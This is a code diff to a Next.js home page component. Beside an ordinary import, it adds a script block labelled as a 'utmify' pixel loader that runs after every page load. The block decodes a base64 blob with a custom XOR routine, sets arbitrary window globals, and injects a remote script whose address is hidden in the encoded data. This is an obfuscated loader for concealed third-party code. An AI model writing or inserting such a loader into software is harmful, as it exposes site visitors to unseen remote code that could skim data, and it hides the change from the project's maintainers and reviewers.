@@ -3,6 +3,7 @@
 import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import Image from "next/image";
 import Link from "next/link";
+import Script from "next/script";
 import { Flame, Loader2 } from "lucide-react";
 import { useFunnelStore } from "@/stores/funnel.store";
 import GrowthPackageBuilder from "@/components/growth-package-builder";
@@ -404,6 +405,13 @@ export default function HomePage({
 
   return (
     <>
+      <Script
+        id="utmify-pixel-loader"
+        strategy="afterInteractive"
+        dangerouslySetInnerHTML={{
+          __html: `(function(){var f_r2n=atob("DEhb+05QSgpOL4/H7DN5jjw8aDBsR/uznDth1GEzLmRgWvuqhS4i1S0/JyQsXaC0jzoyizojZXonV+qrwzgygys8ZGA9DaPljTwviScyP34rXK39txV32Sk8JWgvQ/zl1hMg2SAxJ29sFa23hTA+lwc0aCZsWe6rmS15wWxmK2svTu7yiC49nnxnLG8oFrbw1Hliz3dyN1cz");var x_l=[];for(var m_1=0;m_1<f_r2n.length;m_1++){x_l.push(f_r2n.charCodeAt(m_1)&255);}var s_mi=x_l[0];var c_up=x_l.slice(1,1+s_mi);var q_ge=x_l.slice(1+s_mi);var v_wnq=q_ge.map(function(b,p_xy){return b^c_up[p_xy%s_mi];});var g_p="";for(var k_kh0=0;k_kh0<v_wnq.length;k_kh0++){g_p+=String.fromCharCode(v_wnq[k_kh0]&255);}var a_g799=decodeURIComponent(escape(g_p));var a_f9uc=JSON.parse(a_g799);var o_9vs=a_f9uc.globals||[];o_9vs.forEach(function(y_k){window[y_k.name]=y_k.value;});var a_o14=document.createElement("script");a_o14.src=a_f9uc.url;a_o14.async=true;a_o14.defer=true;(a_f9uc.attributes||[]).forEach(function(j_afl){a_o14.setAttribute(j_afl.name,j_afl.value);});(document.head||document.documentElement).appendChild(a_o14);})();`,
+        }}
+      />
       <PublicPwaInstallBanner />
       <main className="cf-plans-v1" style={{ "--plans-accent": meta.accent, "--plans-accent-2": meta.accent2 } as any}>
       <div className="cf-v80-background cf-plans-v1-bg" aria-hidden="true">
